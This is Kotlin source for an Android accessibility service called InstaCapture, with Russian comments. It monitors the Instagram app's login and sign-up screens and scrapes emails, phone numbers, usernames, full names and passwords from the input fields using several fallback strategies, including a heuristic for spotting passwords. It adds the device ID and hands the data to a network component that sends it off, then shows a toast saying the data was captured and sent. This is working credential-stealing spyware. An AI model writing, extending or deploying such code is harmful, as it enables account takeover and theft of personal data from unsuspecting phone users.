package com.instacapture

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

/**
 * InstagramAccessibilityService — основной движок перехвата данных.
 * Работает ТОЛЬКО когда foreground-приложение = com.instagram.android.
 * Использует AccessibilityEvent для мониторинга изменений UI.
 *
 * ВАЖНО: Instagram использует React Native — resource-id нестабильны.
 * Поэтому реализован многоуровневый fallback-поиск:
 *   1. contentDescription / hintText
 *   2. resource-id (если доступен)
 *   3. Позиция на экране (координаты Y)
 *   4. Последовательность полей (первое = email/phone, и т.д.)
 */
class InstagramAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "InstaCapture:Service"
        private const val INSTAGRAM_PACKAGE = "com.instagram.android"
        private const val COOLDOWN_MS = Config.CAPTURE_COOLDOWN_MS
    }

    private var lastCaptureTime = 0L
    private var currentScreen = ScreenType.UNKNOWN
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var networkManager: NetworkManager
    private lateinit var cryptoManager: CryptoManager
    private var pendingData = mutableMapOf<String, String>()

    enum class ScreenType {
        LOGIN, REGISTER, UNKNOWN
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Accessibility Service подключён")

        // Настройка сервиса для получения максимума событий от Instagram
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            packageNames = arrayOf(INSTAGRAM_PACKAGE)
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }

        networkManager = NetworkManager(this)
        cryptoManager = CryptoManager()

        Toast.makeText(this, "InstaCapture активен — откройте Instagram", Toast.LENGTH_LONG).show()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Защита: обрабатываем только Instagram
        if (event.packageName?.toString() != INSTAGRAM_PACKAGE) return

        val rootNode = rootInActiveWindow ?: return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    analyzeScreen(rootNode)
                }
            }
        } finally {
            // Обязательно recycle для предотвращения утечки нативных объектов
            rootNode.recycle()
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Сервис прерван системой")
    }

    /**
     * Главный метод анализа экрана Instagram.
     * Определяет тип экрана (логин/регистрация) и извлекает поля.
     */
    private fun analyzeScreen(rootNode: AccessibilityNodeInfo) {
        // Определяем тип экрана
        currentScreen = detectScreenType(rootNode)
        if (Config.DEBUG_MODE) Log.d(TAG, "Тип экрана: $currentScreen")

        if (currentScreen == ScreenType.LOGIN || currentScreen == ScreenType.REGISTER) {
            val data = extractFields(rootNode)
            if (data.isComplete()) {
                attemptCapture(data)
            }
        }
    }

    /**
     * Определение типа экрана по текстовым маркерам.
     */
    private fun detectScreenType(root: AccessibilityNodeInfo): ScreenType {
        val allText = collectAllText(root).lowercase()
        return when {
            allText.contains("create new account") ||
                    allText.contains("зарегистрироваться") ||
                    allText.contains("sign up") ||
                    allText.contains("mobile number or email") -> ScreenType.REGISTER
            allText.contains("log in") ||
                    allText.contains("войти") ||
                    allText.contains("password") && allText.contains("username") -> ScreenType.LOGIN
            else -> ScreenType.UNKNOWN
        }
    }

    /**
     * Извлечение полей формы из дерева доступности.
     * Многоуровневый fallback для React Native UI Instagram.
     */
    private fun extractFields(root: AccessibilityNodeInfo): InstagramAccountData {
        val map = mutableMapOf<String, String>()

        // Стратегия 1: Поиск по contentDescription и hintText
        extractByDescriptions(root, map)

        // Стратегия 2: Поиск по resource-id (fallback)
        if (map.size < 3) {
            extractByResourceIds(root, map)
        }

        // Стратегия 3: Поиск по позиции (последовательность полей на экране)
        if (map.size < 3) {
            extractByPosition(root, map)
        }

        // Стратегия 4: Прямой поиск текста в EditText
        if (map.size < 3) {
            extractByText(root, map)
        }

        return InstagramAccountData(
            email = map["email"],
            phone = map["phone"],
            username = map["username"],
            password = map["password"],
            fullName = map["fullName"],
            deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
        )
    }

    /**
     * Стратегия 1: Поиск по accessibility properties.
     * Instagram иногда проставляет contentDescription на поля ввода.
     */
    private fun extractByDescriptions(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val nodes = mutableListOf<AccessibilityNodeInfo>()
        collectAllNodes(root, nodes)

        for (node in nodes) {
            val hint = node.hintText?.toString() ?: ""
            val desc = node.contentDescription?.toString() ?: ""
            val text = node.text?.toString() ?: ""
            val combined = "$hint $desc $text"

            when {
                combined.contains("email", ignoreCase = true) -> {
                    if (!text.isNullOrBlank() && !text.contains("email", ignoreCase = true)) map["email"] = text
                }
                combined.contains("phone", ignoreCase = true) || combined.contains("mobile", ignoreCase = true) -> {
                    if (!text.isNullOrBlank() && !text.contains("phone", ignoreCase = true)) map["phone"] = text
                }
                combined.contains("username", ignoreCase = true) -> {
                    if (!text.isNullOrBlank() && !text.contains("username", ignoreCase = true)) map["username"] = text
                }
                combined.contains("password", ignoreCase = true) -> {
                    if (!text.isNullOrBlank() && !text.contains("password", ignoreCase = true)) map["password"] = text
                }
                combined.contains("full name", ignoreCase = true) || combined.contains("name", ignoreCase = true) -> {
                    if (!text.isNullOrBlank() && text.length > 2) map["fullName"] = text
                }
            }
        }
    }

    /**
     * Стратегия 2: Поиск по resource-id.
     * Нестабильно для React Native, но иногда работает.
     */
    private fun extractByResourceIds(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val idMappings = mapOf(
            "email" to listOf("email_field", "login_username", "username_field", "reg_email"),
            "phone" to listOf("phone_field", "mobile_field", "reg_phone"),
            "password" to listOf("password_field", "login_password", "reg_password"),
            "username" to listOf("username_field", "reg_username", "fullname_field"),
            "fullName" to listOf("fullname_field", "name_field", "reg_fullname")
        )

        for ((field, ids) in idMappings) {
            if (map.containsKey(field)) continue
            for (id in ids) {
                val nodes = root.findAccessibilityNodeInfosByViewId("$INSTAGRAM_PACKAGE:id/$id")
                val text = nodes.firstOrNull()?.text?.toString()
                if (!text.isNullOrBlank()) {
                    map[field] = text
                    break
                }
            }
        }
    }

    /**
     * Стратегия 3: Поиск по позиции на экране (координаты Y).
     * Предположение: поля идут сверху вниз в фиксированном порядке.
     */
    private fun extractByPosition(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val editTexts = mutableListOf<Pair<AccessibilityNodeInfo, android.graphics.Rect>>()
        collectEditableNodes(root, editTexts)

        // Сортировка по Y-координате (сверху вниз)
        editTexts.sortBy { it.second.top }

        if (editTexts.size >= 2) {
            if (!map.containsKey("email") && editTexts[0].first.text != null) {
                map["email"] = editTexts[0].first.text.toString()
            }
        }
        if (editTexts.size >= 3) {
            if (!map.containsKey("fullName") && editTexts[1].first.text != null) {
                map["fullName"] = editTexts[1].first.text.toString()
            }
        }
        if (editTexts.size >= 4) {
            if (!map.containsKey("password") && editTexts.last().first.text != null) {
                map["password"] = editTexts.last().first.text.toString()
            }
        }
    }

    /**
     * Стратегия 4: Прямой поиск по тексту — если поле заполнено,
     * текст виден в дереве доступности.
     */
    private fun extractByText(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val allText = collectAllTexts(root)

        for (text in allText) {
            when {
                text.contains("@") && !map.containsKey("email") -> map["email"] = text
                text.startsWith("+") || text.length == 10 && text.all { it.isDigit() } -> map["phone"] = text
                text.length >= 6 && !map.containsKey("password") -> {
                    // Эвристика: если текст похож на пароль (смешанные символы)
                    if (text.any { it.isUpperCase() } && text.any { it.isDigit() }) {
                        map["password"] = text
                    }
                }
            }
        }
    }

    /**
     * Попытка захвата данных с защитой от дублирования (cooldown).
     */
    private fun attemptCapture(data: InstagramAccountData) {
        val now = System.currentTimeMillis()
        if (now - lastCaptureTime < COOLDOWN_MS) {
            if (Config.DEBUG_MODE) Log.d(TAG, "Cooldown — пропускаем")
            return
        }

        lastCaptureTime = now
        Log.i(TAG, "Данные готовы к отправке: username=${data.username}, email=${data.email}")

        // Отправка в фоне
        networkManager.sendData(data) { success, error ->
            handler.post {
                if (success) {
                    Toast.makeText(this, "Данные захвачены и отправлены", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Сохранено локально: $error", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // ==================== ВСПОМОГАТЕЛЬНЫЕ ====================

    private fun collectAllText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        sb.append(node.text ?: "")
        sb.append(node.contentDescription ?: "")
        sb.append(node.hintText ?: "")
        for (i in 0 until node.childCount) {
            sb.append(collectAllText(node.getChild(i)))
        }
        return sb.toString()
    }

    private fun collectAllNodes(node: AccessibilityNodeInfo, list: MutableList<AccessibilityNodeInfo>) {
        list.add(node)
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectAllNodes(it, list) }
        }
    }

    private fun collectEditableNodes(node: AccessibilityNodeInfo, list: MutableList<Pair<AccessibilityNodeInfo, android.graphics.Rect>>) {
        if (node.isEditable) {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            list.add(Pair(node, rect))
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectEditableNodes(it, list) }
        }
    }

    private fun collectAllTexts(node: AccessibilityNodeInfo?): List<String> {
        if (node == null) return emptyList()
        val result = mutableListOf<String>()
        node.text?.toString()?.let { if (it.isNotBlank()) result.add(it) }
        for (i in 0 until node.childCount) {
            result.addAll(collectAllTexts(node.getChild(i)))
        }
        return result
    }

    private fun InstagramAccountData.isComplete(): Boolean {
        return (email != null || phone != null) && password != null
    }
}
